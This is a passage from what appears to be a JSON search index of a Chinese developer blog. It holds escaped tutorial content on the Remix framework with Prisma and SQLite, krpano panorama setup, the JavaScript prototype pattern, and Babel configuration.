htmlFor=\u0026quot;markdown\u0026quot;\u0026gt;Markdown:\u0026lt;/label\u0026gt;{\u0026quot; \u0026quot;}\r{errors?.markdown \u0026amp;\u0026amp; \u0026lt;em\u0026gt;Markdown is required\u0026lt;/em\u0026gt;}\r\u0026lt;br /\u0026gt;\r\u0026lt;textarea id=\u0026quot;markdown\u0026quot; rows={20} name=\u0026quot;markdown\u0026quot; /\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\r\u0026lt;button type=\u0026quot;submit\u0026quot;\u0026gt;\r{transition.submission\r? \u0026quot;Creating...\u0026quot;\r: \u0026quot;Create Post\u0026quot;}\r\u0026lt;/button\u0026gt;\r\u0026lt;/p\u0026gt;\r\u0026lt;/Form\u0026gt;\r);\r}\r","description":"","id":57,"section":"react","tags":null,"title":"Remix 基础","uri":"https://danacoding.github.io/react/remix/remix-base/"},{"content":"Spritespin 图片排序 在用数字标志图片名称的时候，图片的旋转顺序应该为逆时针，这样在用鼠标拖拽的时候才能按照鼠标拖拽的方向旋转。 否则，图片旋转方向看起来就是反方向。\nkrpano场景切换 Step1. 将工具切好的内饰位置图片文件夹有序地放入项目panos文件夹中\n 例如： 0.tiles 1.tiles 2.tiles\n Step2. 在tour.xml文件中编辑场景和热点的信息\nStep3. 通过配置tour.xml中的scene和skin/njtvtourskin.xml中的\u0026lt;skin_settings来切换不同的内饰场景和其他可选项 \n 参考\n 注意：tour.xml中的：\n\u0026lt;image\u0026gt;\r\u0026lt;cube url=\u0026quot;panos/1.tiles/%s/l%l/%v/l%l_%s_%v_%h.jpg\u0026quot; multires=\u0026quot;512,1024,2048\u0026quot; /\u0026gt;\r\u0026lt;/image\u0026gt;\r`multires` 中的值必须替换为工具切好的实际数值，这样才能正常显示\r","description":"","id":58,"section":"react-native","tags":null,"title":"Spritespin.js \u0026 krpano ","uri":"https://danacoding.github.io/react-native/expo/spritespin-krpano/"},{"content":"  操作系统\n  系统激活\n  Office激活\n  U盘系统安装：\n","description":"","id":59,"section":"others","tags":null,"title":"Win + Office","uri":"https://danacoding.github.io/others/windows/win-office/"},{"content":"原型模式是一种在许多相同类型的对象之间共享属性的有用方法。 原型prototype是 JavaScript 原生的对象，对象可以通过原型链__proto__访问。\n在应用程序中，我们经常需要创建许多相同类型的对象。 一个有用的方法是创建一个 ES6 类的多个实例。\n假设我们想创造很多狗！ 在我们的例子中，狗不能做很多事：它们只有一个名字，而且它们可以吠叫！\n类 class 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); console.log(dog1.name); //Daisy console.log(dog2.name); //Max console.log(dog3.name); //Spot   原型 prototype 请注意，构造函数如何包含 name 属性，而类本身包含 bark 属性。 使用 ES6 类时，在类本身上定义的所有属性（在本例中为 bark）都会自动添加到原型prototype中。\n可以通过访问构造函数上的 prototype 属性直接查看原型，或者通过任何实例上的 __proto__ 属性。\n1 2 3 4 5 6  console.log(Dog.prototype); // constructor: ƒ Dog(name, breed) bark: ƒ bark()  console.log(dog1.__proto__); // constructor: ƒ Dog(name, breed) bark: ƒ bark()   __proto__ 在构造函数的任何实例上的值，是对构造函数原型的直接引用！ 每当我们尝试直接访问对象上不存在的属性时，JavaScript 将沿着原型链向下查看该属性是否在原型链中可用。\n在处理应该可以访问相同属性的对象时，原型模式非常强大。 可以简单地将属性添加到原型，而不是每次都创建属性的副本，因为所有实例都可以访问原型对象。\n由于所有实例都可以访问原型，因此即使在创建实例之后，也可以轻松地向原型添加属性。\n狗不仅应该会吠，还应该会玩！可以通过向原型添加 play 属性来实现这一点。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  class Dog { constructor(name) { this.name = name; } bark() { return `Woof!`; } } const dog1 = new Dog(\u0026#34;Daisy\u0026#34;); const dog2 = new Dog(\u0026#34;Max\u0026#34;); const dog3 = new Dog(\u0026#34;Spot\u0026#34;); Dog.prototype.play = () =\u0026gt; console.log(\u0026#34;Playing now!\u0026#34;); dog1.play(); //Playing now!   原型链 __proto__ 原型链表示可能不止一个步骤。 的确！ 到目前为止，我们只看到了如何访问在 __proto__ 引用的第一个对象上直接可用的属性。 然而，原型本身也有一个 __proto__ 对象！\n让我们创造另一种类型的狗，超级狗！ 这只狗应该继承普通狗的一切，但它也应该会飞。 我们可以通过扩展 Dog 类并添加 fly 方法来创建超级狗。\nclass SuperDog extends Dog {\rconstructor(name) {\rsuper(name);\r}\rfly() {\rreturn \u0026quot;Flying!\u0026quot;;\r}\r}\r让我们创造一只名叫“Daisy”的飞狗，让她吠叫飞翔！\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  class Dog { constructor(name) { this.name = name; } bark() { console.log(\u0026#34;Woof!\u0026#34;); } } class SuperDog extends Dog { constructor(name) { super(name); } fly() { console.log(`Flying!`); } } const dog1 = new SuperDog(\u0026#34;Daisy\u0026#34;); dog1.bark(); //Woof! dog1.fly(); //Flying!   我们可以访问 bark 方法，因为我们扩展了 Dog 类。 SuperDog 原型上 proto 的值指向 Dog.prototype 对象！\n很清楚为什么它被称为原型链：当我们尝试访问对象上不直接可用的属性时，JavaScript 会递归地遍历 __proto__ 指向的所有对象，直到找到该属性！\n\rObject.create Object.create 方法让我们可以创建一个新对象，我们可以将其原型的值显式传递给该对象。\nconst dog = {\rbark() {\rreturn `Woof!`;\r}\r};\rconst pet1 = Object.create(dog);\r虽然 pet1 本身没有任何属性，但它确实可以访问其原型链__proto__上的属性！ 由于我们将 dog 对象作为 pet1 的原型prototype传递，因此我们可以访问 bark 属性。\n1 2 3 4 5 6 7 8 9 10 11 12  const dog = { bark() { console.log(`Woof!`); } }; const pet1 = Object.create(dog); pet1.bark(); // Woof! console.log(\u0026#34;pet1 上的原型prototype属性: \u0026#34;, Object.keys(pet1)); // pet1 上的直接原型prototype属性: [] console.log(\u0026#34;pet1 原型链__proto__的属性: \u0026#34;, Object.keys(pet1.__proto__)); // pet1 原型链__proto__的属性：[\u0026#34;bark\u0026#34;]   Perfect! Object.create 是一种让对象直接从其他对象继承属性的简单方法，通过指定新创建的对象的原型prototype。 新对象可以通过沿着原型链__proto__访问新属性。\n\r优点 原型模式允许我们轻松地让对象访问和继承其他对象的属性。\n由于原型链允许我们访问未直接定义在对象本身上的属性，我们可以避免方法和属性的重复，从而减少使用的内存量。\n知识点  prototype 对象/类本身的属性 __proto__ 原型链上的属性 new 将类实例化为一个对象 extends 类继承 Object.create 创建一个新对象  ","description":"在许多相同类型的对象之间共享属性","id":60,"section":"patterns","tags":null,"title":"原型模式","uri":"https://danacoding.github.io/patterns/design-patterns/prototype-pattern/"},{"content":"一、创建 Remix 项目 npx create-remix@latest\ryarn\ryarn dev\r二、目录结构   app/ - 所有Remix应用程序代码的位置\n  app/entry.client.tsx- JavaScript 的第一部分，它将在应用程序在浏览器中加载时运行。我们使用此文件来补充我们的 React 组件。\n  app/entry.server.tsx- JavaScript 的第一部分，当请求到达您的服务器时，它将运行。Remix 处理加载所有必要的数据，您负责发回响应。我们将使用此文件将 React 应用呈现为字符串/流，并将其作为响应发送给客户端。\n  app/root.tsx- 应用程序放置根组件的位置。在此处呈现元素。\n  app/routes/- 所有\u0026quot;路由模块\u0026quot;的位置。Remix 使用此目录中的文件根据文件的名称为应用创建 URL 路由。\n  public/ - 静态资产（图像/字体/等）的位置\n  remix.config.js - Remix有一些配置选项，您可以在此文件中设置。\n  三、路由（编程式/文件式） 1.这里使用文件式路由\n app/routes/index.tsx\n export default function IndexRoute() {\rreturn \u0026lt;div\u0026gt;Hello Index Route\u0026lt;/div\u0026gt;;\r}\r2. 子路由（嵌套路由）\n app/root.tsx\n import { LiveReload, Outlet } from \u0026quot;remix\u0026quot;;\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026quot;utf-8\u0026quot; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it's funny!\u0026lt;/title\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026quot;development\u0026quot; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r}\r app/routes/jokes/index.tsx\n export default function JokesIndexRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here's a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rI was wondering why the frisbee was getting bigger,\rthen it hit me.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r)\r}\r app/routes/jokes/new.tsx\n export default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026quot;content\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026quot;submit\u0026quot; className=\u0026quot;button\u0026quot;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r3.动态路由（参数化路由）\n app/routes/jokes/$jokeId.tsx\n export default function JokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here's your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;\rWhy don't you find hippopotamuses hiding in trees?\rThey're really good at it.\r\u0026lt;/p\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r四、样式  全局样式   app/root.tsx\n import type { LinksFunction } from \u0026quot;remix\u0026quot;;\rimport { Links, LiveReload, Outlet } from \u0026quot;remix\u0026quot;;\rimport globalStylesUrl from \u0026quot;./styles/global.css\u0026quot;;\rimport globalMediumStylesUrl from \u0026quot;./styles/global-medium.css\u0026quot;;\rimport globalLargeStylesUrl from \u0026quot;./styles/global-large.css\u0026quot;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026quot;stylesheet\u0026quot;,\rhref: globalStylesUrl\r},\r{\rrel: \u0026quot;stylesheet\u0026quot;,\rhref: globalMediumStylesUrl,\rmedia: \u0026quot;print, (min-width: 640px)\u0026quot;\r},\r{\rrel: \u0026quot;stylesheet\u0026quot;,\rhref: globalLargeStylesUrl,\rmedia: \u0026quot;screen and (min-width: 1024px)\u0026quot;\r}\r];\r};\rexport default function App() {\rreturn (\r\u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt;\r\u0026lt;head\u0026gt;\r\u0026lt;meta charSet=\u0026quot;utf-8\u0026quot; /\u0026gt;\r\u0026lt;title\u0026gt;Remix: So great, it's funny!\u0026lt;/title\u0026gt;\r\u0026lt;Links /\u0026gt;\r\u0026lt;/head\u0026gt;\r\u0026lt;body\u0026gt;\r\u0026lt;Outlet /\u0026gt;\r{process.env.NODE_ENV === \u0026quot;development\u0026quot; ? (\r\u0026lt;LiveReload /\u0026gt;\r) : null}\r\u0026lt;/body\u0026gt;\r\u0026lt;/html\u0026gt;\r);\r}\r组件样式 (需要在root.tsx中调用组件才能渲染)   app/routes/index.tsx\n import type { LinksFunction } from \u0026quot;remix\u0026quot;;\rimport { Link } from \u0026quot;remix\u0026quot;;\rimport stylesUrl from \u0026quot;../styles/index.css\u0026quot;;\rexport const links: LinksFunction = () =\u0026gt; {\rreturn [\r{\rrel: \u0026quot;stylesheet\u0026quot;,\rhref: stylesUrl\r}\r];\r};\rexport default function Index() {\rreturn (\r\u0026lt;div className=\u0026quot;container\u0026quot;\u0026gt;\r\u0026lt;div className=\u0026quot;content\u0026quot;\u0026gt;\r\u0026lt;h1\u0026gt;\rRemix \u0026lt;span\u0026gt;Jokes!\u0026lt;/span\u0026gt;\r\u0026lt;/h1\u0026gt;\r\u0026lt;nav\u0026gt;\r\u0026lt;ul\u0026gt;\r\u0026lt;li\u0026gt;\r\u0026lt;Link to=\u0026quot;jokes\u0026quot;\u0026gt;Read Jokes\u0026lt;/Link\u0026gt;\r\u0026lt;/li\u0026gt;\r\u0026lt;/ul\u0026gt;\r\u0026lt;/nav\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r五、数据库 （这里使用Prisma ORM 和 SQLite 数据库） Step1. 安装 Prisma\n 为 Prisma 安装 VSCode 插件\n yarn add --dev prisma //用于在开发过程中与我们的数据库和schema进行交互\ryarn add @prisma/client //用于在运行时对我们的数据库进行查询\rStep2. 用 SQLite 初始化 Prisma\nnpx prisma init --datasource-provider sqlite\rStep3. 为数据建模\n prisma/schema.prisma\n generator client {\rprovider = \u0026quot;prisma-client-js\u0026quot;\r}\rdatasource db {\rprovider = \u0026quot;sqlite\u0026quot;\rurl = env(\u0026quot;DATABASE_URL\u0026quot;)\r}\rmodel Joke {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r}\rStep4. 推送数据模型到 SQLite\n 如果您的数据库搞砸了，您可以随时删除该prisma/dev.db文件并npx prisma db push再次运行。\n npx prisma db push\rStep5. 禁止 dev.db 提交到 github\n .gitignore\n /prisma/dev.db\r.env\rStep6. 测试数据填充数据库\n prisma/seed.ts\n import { PrismaClient } from \u0026quot;@prisma/client\u0026quot;;\rconst db = new PrismaClient();\rasync function seed() {\rawait Promise.all(\rgetJokes().map(joke =\u0026gt; {\rreturn db.joke.create({ data: joke });\r})\r);\r}\rseed();\rfunction getJokes() {\r// shout-out to https://icanhazdadjoke.com/\rreturn [\r{\rname: \u0026quot;Road worker\u0026quot;,\rcontent: `I never wanted to believe that my Dad was stealing from his job as a road worker. But when I got home, all the signs were there.`\r},\r{\rname: \u0026quot;Frisbee\u0026quot;,\rcontent: `I was wondering why the frisbee was getting bigger, then it hit me.`\r},\r{\rname: \u0026quot;Trees\u0026quot;,\rcontent: `Why do trees seem suspicious on sunny days? Dunno, they're just a bit shady.`\r},\r{\rname: \u0026quot;Skeletons\u0026quot;,\rcontent: `Why don't skeletons ride roller coasters? They don't have the stomach for it.`\r},\r{\rname: \u0026quot;Hippos\u0026quot;,\rcontent: `Why don't you find hippopotamuses hiding in trees? They're really good at it.`\r},\r{\rname: \u0026quot;Dinner\u0026quot;,\rcontent: `What did one plate say to the other plate? Dinner is on me!`\r},\r{\rname: \u0026quot;Elevator\u0026quot;,\rcontent: `My first time using an elevator was an uplifting experience. The second time let me down.`\r}\r];\r}\r 安装esbuild-register为开发依赖项：\n yarn add --dev esbuild-register\r 运行 seed.ts 文件\n node --require esbuild-register prisma/seed.ts\r 将此添加到package.json,避免每次重置数据都必须记住该脚本\n // ...\r\u0026quot;prisma\u0026quot;: {\r\u0026quot;seed\u0026quot;: \u0026quot;node --require esbuild-register prisma/seed.ts\u0026quot;\r},\r\u0026quot;scripts\u0026quot;: {\r// ...\rStep7. 连接到数据库\n prisma/seed.ts\n import { PrismaClient } from \u0026quot;@prisma/client\u0026quot;;\rconst db = new PrismaClient();\r 创建 app/utils/db.server.ts\n import { PrismaClient } from \u0026quot;@prisma/client\u0026quot;;\rlet db: PrismaClient;\rdeclare global {\rvar __db: PrismaClient | undefined;\r}\r//这是必需的，因为在开发中我们不想在每次更改时都重新启动服务器，\r//但我们想确保我们也不会在每次更改时都创建到数据库的新连接。\rif (process.env.NODE_ENV === \u0026quot;production\u0026quot;) {\rdb = new PrismaClient();\rdb.$connect();\r} else {\rif (!global.__db) {\rglobal.__db = new PrismaClient();\rglobal.__db.$connect();\r}\rdb = global.__db;\r}\rexport { db };\rStep8. 限制数据获取数量\n app/routes/jokes\n type LoaderData = {\rjokeListItems: Array\u0026lt;{ id: string; name: string }\u0026gt;;\r};\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst data: LoaderData = {\rjokeListItems: await db.joke.findMany({\rtake: 5,\rselect: { id: true, name: true },\rorderBy: { createdAt: \u0026quot;desc\u0026quot; }\r})\r};\rreturn data;\r};\rStep9. 数据库查询\n app/routes/jokes/$jokeId.tsx\n import type { LoaderFunction } from \u0026quot;remix\u0026quot;;\rimport { Link, useLoaderData } from \u0026quot;remix\u0026quot;;\rimport type { Joke } from \u0026quot;@prisma/client\u0026quot;;\rimport { db } from \u0026quot;~/utils/db.server\u0026quot;;\rtype LoaderData = { joke: Joke };\rexport const loader: LoaderFunction = async ({\rparams\r}) =\u0026gt; {\rconst joke = await db.joke.findUnique({\rwhere: { id: params.jokeId }\r});\rif (!joke) throw new Error(\u0026quot;Joke not found\u0026quot;);\rconst data: LoaderData = { joke };\rreturn data;\r};\rexport default function JokeRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here's your hilarious joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.joke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to=\u0026quot;.\u0026quot;\u0026gt;{data.joke.name} Permalink\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r 随机查询 app/routes/jokes/index.tsx\n import type { LoaderFunction } from \u0026quot;remix\u0026quot;;\rimport { useLoaderData, Link } from \u0026quot;remix\u0026quot;;\rimport type { Joke } from \u0026quot;@prisma/client\u0026quot;;\rimport { db } from \u0026quot;~/utils/db.server\u0026quot;;\rtype LoaderData = { randomJoke: Joke };\rexport const loader: LoaderFunction = async () =\u0026gt; {\rconst count = await db.joke.count();\rconst randomRowNumber = Math.floor(Math.random() * count);\rconst [randomJoke] = await db.joke.findMany({\rtake: 1,\rskip: randomRowNumber\r});\rconst data: LoaderData = { randomJoke };\rreturn data;\r};\rexport default function JokesIndexRoute() {\rconst data = useLoaderData\u0026lt;LoaderData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Here's a random joke:\u0026lt;/p\u0026gt;\r\u0026lt;p\u0026gt;{data.randomJoke.content}\u0026lt;/p\u0026gt;\r\u0026lt;Link to={data.randomJoke.id}\u0026gt;\r\u0026quot;{data.randomJoke.name}\u0026quot; Permalink\r\u0026lt;/Link\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rStep10. 突变 （添加数据）\n app/routes/new.tsx\n import type { ActionFunction } from \u0026quot;remix\u0026quot;;\rimport { redirect } from \u0026quot;remix\u0026quot;;\rimport { db } from \u0026quot;~/utils/db.server\u0026quot;;\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026quot;name\u0026quot;);\rconst content = form.get(\u0026quot;content\u0026quot;);\r// we do this type check to be extra sure and to make TypeScript happy\r// we'll explore validation next!\rif (\rtypeof name !== \u0026quot;string\u0026quot; ||\rtypeof content !== \u0026quot;string\u0026quot;\r) {\rthrow new Error(`Form not submitted correctly.`);\r}\rconst fields = { name, content };\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName: \u0026lt;input type=\u0026quot;text\u0026quot; name=\u0026quot;name\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent: \u0026lt;textarea name=\u0026quot;content\u0026quot; /\u0026gt;\r\u0026lt;/label\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026quot;submit\u0026quot; className=\u0026quot;button\u0026quot;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r六、数据验证  app/routes/jokes/new.tsx\n import type { ActionFunction } from \u0026quot;remix\u0026quot;;\rimport { useActionData, redirect, json } from \u0026quot;remix\u0026quot;;\rimport { db } from \u0026quot;~/utils/db.server\u0026quot;;\rfunction validateJokeContent(content: string) {\rif (content.length \u0026lt; 10) {\rreturn `That joke is too short`;\r}\r}\rfunction validateJokeName(name: string) {\rif (name.length \u0026lt; 2) {\rreturn `That joke's name is too short`;\r}\r}\rtype ActionData = {\rformError?: string;\rfieldErrors?: {\rname: string | undefined;\rcontent: string | undefined;\r};\rfields?: {\rname: string;\rcontent: string;\r};\r};\rconst badRequest = (data: ActionData) =\u0026gt;\rjson(data, { status: 400 });\rexport const action: ActionFunction = async ({\rrequest\r}) =\u0026gt; {\rconst form = await request.formData();\rconst name = form.get(\u0026quot;name\u0026quot;);\rconst content = form.get(\u0026quot;content\u0026quot;);\rif (\rtypeof name !== \u0026quot;string\u0026quot; ||\rtypeof content !== \u0026quot;string\u0026quot;\r) {\rreturn badRequest({\rformError: `Form not submitted correctly.`\r});\r}\rconst fieldErrors = {\rname: validateJokeName(name),\rcontent: validateJokeContent(content)\r};\rconst fields = { name, content };\rif (Object.values(fieldErrors).some(Boolean)) {\rreturn badRequest({ fieldErrors, fields });\r}\rconst joke = await db.joke.create({ data: fields });\rreturn redirect(`/jokes/${joke.id}`);\r};\rexport default function NewJokeRoute() {\rconst actionData = useActionData\u0026lt;ActionData\u0026gt;();\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;p\u0026gt;Add your own hilarious joke\u0026lt;/p\u0026gt;\r\u0026lt;form method=\u0026quot;post\u0026quot;\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rName:{\u0026quot; \u0026quot;}\r\u0026lt;input\rtype=\u0026quot;text\u0026quot;\rdefaultValue={actionData?.fields?.name}\rname=\u0026quot;name\u0026quot;\raria-invalid={\rBoolean(actionData?.fieldErrors?.name) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.name\r? \u0026quot;name-error\u0026quot;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.name ? (\r\u0026lt;p\rclassName=\u0026quot;form-validation-error\u0026quot;\rrole=\u0026quot;alert\u0026quot;\rid=\u0026quot;name-error\u0026quot;\r\u0026gt;\r{actionData.fieldErrors.name}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;label\u0026gt;\rContent:{\u0026quot; \u0026quot;}\r\u0026lt;textarea\rdefaultValue={actionData?.fields?.content}\rname=\u0026quot;content\u0026quot;\raria-invalid={\rBoolean(actionData?.fieldErrors?.content) ||\rundefined\r}\raria-describedby={\ractionData?.fieldErrors?.content\r? \u0026quot;content-error\u0026quot;\r: undefined\r}\r/\u0026gt;\r\u0026lt;/label\u0026gt;\r{actionData?.fieldErrors?.content ? (\r\u0026lt;p\rclassName=\u0026quot;form-validation-error\u0026quot;\rrole=\u0026quot;alert\u0026quot;\rid=\u0026quot;content-error\u0026quot;\r\u0026gt;\r{actionData.fieldErrors.content}\r\u0026lt;/p\u0026gt;\r) : null}\r\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button type=\u0026quot;submit\u0026quot; className=\u0026quot;button\u0026quot;\u0026gt;\rAdd\r\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/form\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\r七、身份验证 Step1. prisma/schema.prisma\n// This is your Prisma schema file,\r// learn more about it in the docs: https://pris.ly/d/prisma-schema\rgenerator client {\rprovider = \u0026quot;prisma-client-js\u0026quot;\r}\rdatasource db {\rprovider = \u0026quot;sqlite\u0026quot;\rurl = env(\u0026quot;DATABASE_URL\u0026quot;)\r}\rmodel User {\rid String @id @default(uuid())\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rusername String @unique\rpasswordHash String\rjokes Joke[]\r}\rmodel Joke {\rid String @id @default(uuid())\rjokesterId String\rjokester User @relation(fields: [jokesterId], references: [id], onDelete: Cascade)\rcreatedAt DateTime @default(now())\rupdatedAt DateTime @updatedAt\rname String\rcontent String\r}\rStep2. 重置数据库\nnpx prisma db push\r","description":"我并不看好Remix这种类型的不伦不类的框架，所以不会再更新","id":61,"section":"react","tags":null,"title":"Remix 进阶","uri":"https://danacoding.github.io/react/remix/remix-adv/"},{"content":"一、全局配置yarn Step1. 获取yarn的安装位置\nyarn global bin\rStep2. 配置yarn全局变量\n","description":"","id":62,"section":"others","tags":null,"title":"yarn 最佳实践","uri":"https://danacoding.github.io/others/yarn/yarn-bp/"},{"content":"Babel是Web Developer工具集中的出色条目。 这是一个了不起的工具，已经存在了一段时间，但是如今几乎每个JavaScript开发人员都依赖它，并且这种情况将继续下去，因为Babel现在不可或缺，并且已经解决了每个人的大难题。\n哪个问题？\n每个Web开发人员肯定都有的问题：JavaScript的功能在最新版本的浏览器中可用，但在较早的版本中不可用。 也许Chrome或Firefox可以实现它，但Safari iOS和Edge却不能。\n例如，ES6引入了箭头函数：\n[1, 2, 3].map((n) =\u0026gt; n + 1)\r现在所有现代浏览器都支持该功能。 IE11不支持它，也不支持Opera Mini（我怎么知道？通过检查ES6兼容性表）。\n那么您应该如何处理这个问题呢？ 您应该继续前进，让那些使用较旧/不兼容浏览器的客户留下来，还是应该编写较旧的JavaScript代码使所有用户满意？\n输入Babel。 Babel是一个编译器：它采用一种标准编写的代码，然后将其转换为另一种标准编写的代码。\n您可以配置Babel将现代ES2017 JavaScript转换为JavaScript ES5语法：\n[1, 2, 3].map(function(n) {\rreturn n + 1\r})\r这必须在构建时发生，因此您必须设置一个工作流程来为您处理。\nWebpack是常见的解决方案。\n（请注意，如果您对这些ES事情都感到困惑，请参阅ECMAScript指南中有关ES版本的更多信息）\n一、安装Babel 使用npm可以很容易地在项目本地安装Babel：\nnpm install --save-dev @babel/core @babel/cli\r过去，我建议在全局范围内安装babel-cli，但是现在Babel维护人员不建议这样做，因为通过在本地使用babel，您可以在每个项目中使用不同版本的Babel，而且在存储库中检入babel对于团队合作更有利\n由于npm现在随npx一起提供，因此可以通过在项目文件夹中键入命令来运行本地安装的CLI软件包：\nnpx babel script.js\r二、Babel配置示例 Babel开箱即用并没有做任何有用的事情，您需要对其进行配置并添加插件。\n这是Babel插件的列表\n为了解决我们在简介中讨论的问题（在每个浏览器中使用箭头功能），我们可以运行\nnpm install --save-dev @babel/plugin-transform-es2015-arrow-functions\r将该包下载到我们应用程序的node_modules文件夹中，那么我们需要添加\n{\r\u0026quot;plugins\u0026quot;: [\u0026quot;transform-es2015-arrow-functions\u0026quot;]\r}\r到应用程序根文件夹中存在的.babelrc文件。 如果还没有该文件，则只需创建一个空白文件，然后将其内容放入其中。\n提示：如果您从未见过点文件（以点开头的文件），乍一看可能很奇怪，因为该文件可能不会出现在文件管理器中，因为它是隐藏文件。\n现在，如果我们有一个包含以下内容的script.js文件：\nvar a = () =\u0026gt; {};\rvar a = (b) =\u0026gt; b;\rconst double = [1,2,3].map((num) =\u0026gt; num * 2);\rconsole.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026quot;Bob\u0026quot;,\r_friends: [\u0026quot;Sally\u0026quot;, \u0026quot;Tom\u0026quot;],\rprintFriends() {\rthis._friends.forEach(f =\u0026gt;\rconsole.log(this._name + \u0026quot; knows \u0026quot; + f));\r}\r};\rconsole.log(bob.printFriends());\r运行babel script.js将输出以下代码：\nvar a = function () {};var a = function (b) {\rreturn b;\r};\rconst double = [1, 2, 3].map(function (num) {\rreturn num * 2;\r});console.log(double); // [2,4,6]\rvar bob = {\r_name: \u0026quot;Bob\u0026quot;,\r_friends: [\u0026quot;Sally\u0026quot;, \u0026quot;Tom\u0026quot;],\rprintFriends() {\rvar _this = this;\rthis._friends.forEach(function (f) {\rreturn console.log(_this._name + \u0026quot; knows \u0026quot; + f);\r});\r}\r};\rconsole.log(bob.printFriends());\r如您所见，箭头函数已全部转换为JavaScript ES5函数。\n三、Babel预设 我们刚刚在上一篇文章中看到了如何配置Babel来转换特定的JavaScript函数。\n您可以添加更多的插件，但是不能一一添加到配置功能中，这是不实际的。\n这就是Babel提供预设的原因。\n最受欢迎的预设是env和react。\n提示：Babel 7已弃用（并删除了）每年的预设（例如preset-es2017和舞台预设）。 请改用@babel/preset-env。\nenv预设非常好：您告诉它要支持哪些环境，它确实为您提供所有功能，并支持所有现代JavaScript功能。\n例如。 “支持每个浏览器的最后2个版本，但对于Safari，支持Safari 7之后的所有版本。\n{\r\u0026quot;presets\u0026quot;: [\r[\u0026quot;env\u0026quot;, {\r\u0026quot;targets\u0026quot;: {\r\u0026quot;browsers\u0026quot;: [\u0026quot;last 2 versions\u0026quot;, \u0026quot;safari \u0026gt;= 